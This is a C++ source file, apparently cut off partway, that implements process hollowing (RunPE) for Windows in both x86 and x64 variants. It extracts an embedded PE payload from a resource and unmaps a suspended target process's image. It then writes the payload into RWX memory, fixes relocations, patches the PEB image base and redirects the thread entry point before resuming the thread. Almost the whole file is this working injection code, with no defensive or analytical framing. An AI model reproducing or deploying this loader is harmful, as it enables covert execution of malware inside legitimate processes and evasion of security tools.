#include "ProcessHollowing.h"
#include <stdio.h>

/**
 * Function to retrieve the PE file content.
 * \param lpFilePath : path of the PE file.
 * \return : address of the content in the explorer memory.
 */
//HANDLE GetFileContent(int resourceId)
//{
//	void* pData = nullptr;
//	do
//	{
//		// 加载当前模块
//		HMODULE hModule = GetModuleHandle(NULL);
//		if (!hModule) {
//			break;
//		}
//
//		// 查找资源
//		HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
//		if (!hResource) {
//			break;
//		}
//
//		// 加载资源
//		HGLOBAL hResData = LoadResource(hModule, hResource);
//		if (!hResData) {
//			break;
//		}
//
//		// 获取资源大小和数据指针
//		DWORD dataSize = SizeofResource(hModule, hResource);
//		pData = LockResource(hResData);
//	} while (0);
//	return pData;
//}
//HANDLE GetFileContent(int resourceId) {
//	void* pData = nullptr;
//	DWORD dataSize = 0;
//
//	do {
//		// 加载当前模块
//		HMODULE hModule = GetModuleHandle(NULL);
//		if (!hModule) {
//			break;
//		}
//
//		// 查找资源
//		HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
//		if (!hResource) {
//			break;
//		}
//
//		// 加载资源
//		HGLOBAL hResData = LoadResource(hModule, hResource);
//		if (!hResData) {
//			break;
//		}
//
//		// 获取资源大小和数据指针
//		dataSize = SizeofResource(hModule, hResource);
//		pData = LockResource(hResData);
//
//		// 如果没有数据或大小为 0，直接返回空
//		if (!pData || dataSize == 0) {
//			break;
//		}
//
//		// 分配内存并复制资源内容
//		void* pCopy = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dataSize);
//		if (!pCopy) {
//			break;
//		}
//
//		// 将资源数据复制到新分配的内存中
//		memcpy(pCopy, pData, dataSize);
//
//		return pCopy;  // 返回复制的内存地址
//	} while (0);
//
//	return nullptr;
//}

HANDLE GetFileContent(int resourceId) {
	void* pData = nullptr;
	DWORD dataSize = 0;

	OutputDebugStringA("Starting GetFileContent function...\n");

	do {
		// 加载当前模块
		OutputDebugStringA("Loading current module...\n");
		HMODULE hModule = GetModuleHandle(NULL);
		if (!hModule) {
			OutputDebugStringA("Failed to get module handle.\n");
			break;
		}
		OutputDebugStringA("Module handle obtained successfully.\n");

		// 查找资源
		OutputDebugStringA("Finding resource...\n");
		HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
		if (!hResource) {
			OutputDebugStringA("Failed to find resource.\n");
			break;
		}
		OutputDebugStringA("Resource found successfully.\n");

		// 加载资源
		OutputDebugStringA("Loading resource...\n");
		HGLOBAL hResData = LoadResource(hModule, hResource);
		if (!hResData) {
			OutputDebugStringA("Failed to load resource.\n");
			break;
		}
		OutputDebugStringA("Resource loaded successfully.\n");

		// 获取资源大小和数据指针
		OutputDebugStringA("Getting resource size and data pointer...\n");
		dataSize = SizeofResource(hModule, hResource);
		pData = LockResource(hResData);
		if (!pData || dataSize == 0) {
			OutputDebugStringA("Resource data is empty or size is zero.\n");
			break;
		}
		char debugMessage[100];
		sprintf_s(debugMessage, "Resource size: %lu bytes\n", dataSize);
		OutputDebugStringA(debugMessage);

		// 分配内存并复制资源内容
		OutputDebugStringA("Allocating memory for resource copy...\n");
		void* pCopy = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dataSize);
		if (!pCopy) {
			OutputDebugStringA("Failed to allocate memory for resource copy.\n");
			break;
		}
		OutputDebugStringA("Memory allocated successfully.\n");

		// 将资源数据复制到新分配的内存中
		OutputDebugStringA("Copying resource data to allocated memory...\n");
		memcpy(pCopy, pData, dataSize);
		OutputDebugStringA("Resource data copied successfully.\n");

		OutputDebugStringA("GetFileContent function completed successfully.\n");
		return pCopy;  // 返回复制的内存地址
	} while (0);

	OutputDebugStringA("GetFileContent function encountered an error.\n");
	return nullptr;
}

/**
 * Function to check if the image is a valid PE file.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is a valid PE else no.
 */
BOOL IsValidPE(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
		return TRUE;

	return FALSE;
}

/**
 * Function to check if the image is a x86 executable.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is x86 else FALSE.
 */
BOOL IsPE32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		return TRUE;

	return FALSE;
}

/**
 * Function to retrieve the PEB address and image base address of the target process x86.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
ProcessAddressInformation GetProcessAddressInformation32(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	Wow64GetThreadContext(lpPI->hThread, &CTX);
	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)(uintptr_t)CTX.Ebx, lpImageBaseAddress };
}

/**
 * Function to retrieve the PEB address and image base address of the target process x64.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
#ifdef _WIN64
ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(lpPI->hThread, &CTX);
	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)CTX.Rdx, lpImageBaseAddress };
}
#endif

/**
 * Function to retrieve the subsystem of a PE image x86.
 * \param lpImage : data of the PE image.
 * \return : the subsystem charateristics.
 */
DWORD GetSubsytem32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	return lpImageNTHeader->OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsystem of a PE image x64.
 * \param lpImage : data of the PE image.
 * \return : the subsystem charateristics.
 */
DWORD GetSubsytem64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	return lpImageNTHeader->OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsytem of a process x86.
 * \param hProcess : handle of the process.
 * \param lpImageBaseAddress : image base address of the process.
 * \return : the process subsystem charateristics.
 */
DWORD GetSubsystemEx32(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
	constexpr IMAGE_DOS_HEADER ImageDOSHeader = {};
	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
	if (!bGetDOSHeader)
	{
		printf("[-] An error is occured when trying to get the target DOS header.\n");
		return -1;
	}

	constexpr IMAGE_NT_HEADERS32 ImageNTHeader = {};
	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS32), nullptr);
	if (!bGetNTHeader)
	{
		printf("[-] An error is occured when trying to get the target NT header.\n");
		return -1;
	}

	return ImageNTHeader.OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsytem of a process x64.
 * \param hProcess : handle of the process.
 * \param lpImageBaseAddress : image base address of the process.
 * \return : the process subsystem charateristics.
 */
DWORD GetSubsystemEx64(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
	constexpr IMAGE_DOS_HEADER ImageDOSHeader = {};
	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
	if (!bGetDOSHeader)
	{
		printf("[-] An error is occured when trying to get the target DOS header.\n");
		return -1;
	}

	constexpr IMAGE_NT_HEADERS64 ImageNTHeader = {};
	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS64), nullptr);
	if (!bGetNTHeader)
	{
		printf("[-] An error is occured when trying to get the target NT header.\n");
		return -1;
	}

	return ImageNTHeader.OptionalHeader.Subsystem;
}

/**
 * Function to clean and exit target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
{
	if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
	{
		TerminateProcess(lpPI->hProcess, -1);
		CloseHandle(lpPI->hProcess);
	}
}

/**
 * Function to clean the target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void CleanProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
{
	if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
		CloseHandle(lpPI->hProcess);
}

/**
 * Function to check if the source image has a relocation table x86.
 * \param lpImage : content of the source image.
 * \return : TRUE if the image has a relocation table else FALSE.
 */
BOOL HasRelocation32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return TRUE;

	return FALSE;
}

/**
 * Function to check if the source image has a relocation table x64.
 * \param lpImage : content of the source image.
 * \return : TRUE if the image has a relocation table else FALSE.
 */
BOOL HasRelocation64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return TRUE;

	return FALSE;
}

/**
 * Function to retrieve the IMAGE_DATA_DIRECTORY reloc of a x86 image.
 * \param lpImage : PE source image.
 * \return : 0 if fail else the data directory.
 */
IMAGE_DATA_DIRECTORY GetRelocAddress32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

/**
 * Function to retrieve the IMAGE_DATA_DIRECTORY reloc of a x64 image.
 * \param lpImage : PE source image.
 * \return : 0 if fail else the data directory.
 */
IMAGE_DATA_DIRECTORY GetRelocAddress64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

// 修改PE文件重定位表信息
// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址
// 返回值: 成功返回TRUE，否则返回FALSE
BOOL DoRelocationTable(LPVOID lpBaseAddress)
{
	/* 重定位表的结构：
	// DWORD sectionAddress, DWORD size (包括本节需要重定位的数据)
	// 例如 1000节需要修正5个重定位数据的话，重定位表的数据是
	// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000
	// -----------   -----------      ----
	// 给出节的偏移  总尺寸=8+6*2     需要修正的地址           用于对齐4字节
	// 重定位表是若干个相连，如果address 和 size都是0 表示结束
	// 需要修正的地址是12位的，高4位是形态字，intel cpu下是3
	*/
	//假设NewBase是0x600000,而文件中设置的缺省ImageBase是0x400000,则修正偏移量就是0x200000
	//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((unsigned long)pDosHeader + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	// 判断是否有 重定位表
	if ((PVOID)pLoc == (PVOID)pDosHeader)
	{
		// 重定位表 为空
		return TRUE;
	}

	while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //开始扫描重定位表
	{
		WORD* pLocData = (WORD*)((PBYTE)pLoc + sizeof(IMAGE_BASE_RELOCATION));
		//计算本节需要修正的重定位项（地址）的数目
		int nNumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (int i = 0; i < nNumberOfReloc; i++)
		{
			// 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。
			// 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。
/*
			#ifdef _WIN64
			if ((DWORD)(pLocData[i] & 0x0000F000) == 0x0000A000)
			{
			// 64位dll重定位，IMAGE_REL_BASED_DIR64
			// 对于IA-64的可执行文件，重定位似乎总是IMAGE_REL_BASED_DIR64类型的。

			ULONGLONG* pAddress = (ULONGLONG *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
			ULONGLONG ullDelta = (ULONGLONG)pNewBase - m_pNTHeader->OptionalHeader.ImageBase;
			*pAddress += ullDelta;

			}
			#endif
*/
			if ((DWORD)(pLocData[i] & 0x0000F000) == 0x00003000) //这是一个需要修正的地址
			{
				// 32位dll重定位，IMAGE_REL_BASED_HIGHLOW
				// 对于x86的可执行文件，所有的基址重定位都是IMAGE_REL_BASED_HIGHLOW类型的。
				DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
				DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders->OptionalHeader.ImageBase;
				*pAddress += dwDelta;

			}
		}

		//转移到下一个节进行处理
		pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc->SizeOfBlock);
	}

	return TRUE;
}

/**
 * Function to write the new PE image and resume the process thread x86.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	// 获取 ntdll.dll 模块句柄
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (hNtdll == NULL) {
		OutputDebugStringA("Get ntdll module failed .");
		return FALSE;
	}

	// 获取 ZwUnmapViewOfSection 函数的地址
	pfnZwUnmapViewOfSection ZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdll, "ZwUnmapViewOfSection");
	if (ZwUnmapViewOfSection == NULL) {
		OutputDebugStringA("get ZwUnmapViewOfSection failed .");
		return FALSE;
	}

	// 调用 ZwUnmapViewOfSection 卸载指定基地址的映像
	NTSTATUS status = ZwUnmapViewOfSection(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase);
	if (status != 0) { // NT_SUCCESS 宏可以用来检查成功状态
		char zwmsg[512] = { 0 };
		sprintf_s(zwmsg, "[+] ZwUnmapViewOfSection failed with status: %ld.\n", status);
		OutputDebugStringA(zwmsg);
		return FALSE;
	}

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// lpAllocAddress = VirtualAllocEx(lpPI->hProcess, NULL, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	char dbgmsg[512] = { 0 };
	sprintf_s(dbgmsg, "[+] pid: %d,  imagebase 0x%p, sizeofimage %ld.\n", lpPI->dwProcessId,
		(LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, lpImageNTHeader32->OptionalHeader.SizeOfImage);
	OutputDebugStringA(dbgmsg);

	if (lpAllocAddress == nullptr)
	{
		char msg[512] = { 0 };
		sprintf_s(msg, "[-] An error is occured when trying to allocate memory for the new image. error code : %d\n",
			GetLastError());
		OutputDebugStringA(msg);

		MessageBoxA(NULL, "failed", "pedll", MB_OK);

		return FALSE;
	}
	OutputDebugStringA("DoRelocationTable start");

	DoRelocationTable(lpAllocAddress);

	// printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);
	OutputDebugStringA("[+] Memory allocate at : 0x%p\n");

	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		char msg[512] = { 0 };
		sprintf_s(msg, "[-] An error is occured when trying to write the headers of the new image. error code : %d\n",
			GetLastError());
		OutputDebugStringA(msg);
		return FALSE;
	}

	// printf("[+] Headers write at : 0x%p\n", (LPVOID)(DWORD64)lpImageNTHeader32->OptionalHeader.ImageBase);
	
	OutputDebugStringA("[+] Headers write at : 0x%p\n");

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess,
			(LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			// printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			OutputDebugStringA("[-] An error is occured when trying to write the section : %s.\n");
			return FALSE;
		}

		// OutputDebugStringA("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
		OutputDebugStringA("[+] Section %s write at : 0x%p.\n");
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		OutputDebugStringA("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		OutputDebugStringA("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		OutputDebugStringA("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
#ifdef _WIN64
BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	printf("[+] Headers write at : 0x%p\n", (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase);

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
		printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}
#endif

/**
 * Function to fix relocation table and write the new PE image and resume the process thread x86.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
		return FALSE;
	}

	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

	const DWORD DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader32->OptionalHeader.ImageBase;

	lpImageNTHeader32->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		printf("[-] An error is occured when trying to write the headers of the new image.\n");
		return FALSE;
	}

	printf("[+] Headers write at : 0x%p\n", lpAllocAddress);

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress32(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
			return FALSE;
		}

		printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
	}

	if (lpImageRelocSection == nullptr)
	{
		printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
		return FALSE;
	}

	printf("[+] Relocation section : %s\n", (char*)lpImageRelocSection->Name);

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD PatchedAddress = 0;

			ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

		}
	}

	printf("[+] Relocations done.\n");

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
		printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

